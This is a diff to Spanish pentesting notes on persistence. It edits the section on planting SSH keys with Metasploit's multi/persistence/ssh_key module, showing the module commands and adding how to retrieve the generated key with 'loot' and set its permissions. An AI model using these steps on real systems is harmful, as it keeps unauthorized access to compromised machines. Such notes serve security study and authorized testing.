@@ -97,7 +97,7 @@ usr@hostname:~# ssh -i key usr@ip
 
 **Con metasploit:**
 
-En este caso no copia las claves existentes, sino que las crea para los usuarios indicados, para todos si no se indica ninguno.
+En este caso no copia las claves existentes, sino que crea una para los usuarios indicados, para todos si no se indica ninguno.
 
 ```bash
 msf > use exploit/multi/persistence/ssh_key
@@ -105,7 +105,10 @@ msf > use exploit/multi/persistence/ssh_key
 msf exploit(multi/persistence/ssh_key) > set createsshfolder true
 msf exploit(multi/persistence/ssh_key) > set session id
 msf exploit(multi/persistence/ssh_key) > exploit
+msf exploit(multi/persistence/ssh_key) > 
 ```
+
+El comando `loot` de msfconsole Muestra la ruta donde se ha guardado la clave en la maquina local. Estará guardada en un archivo txt, por lo que podemos copiar su contenido en un archivo llamado, por ejemplo `ssh_key` y añadirle permisos `0400`
 
 ### Vía Cron Jobs
 
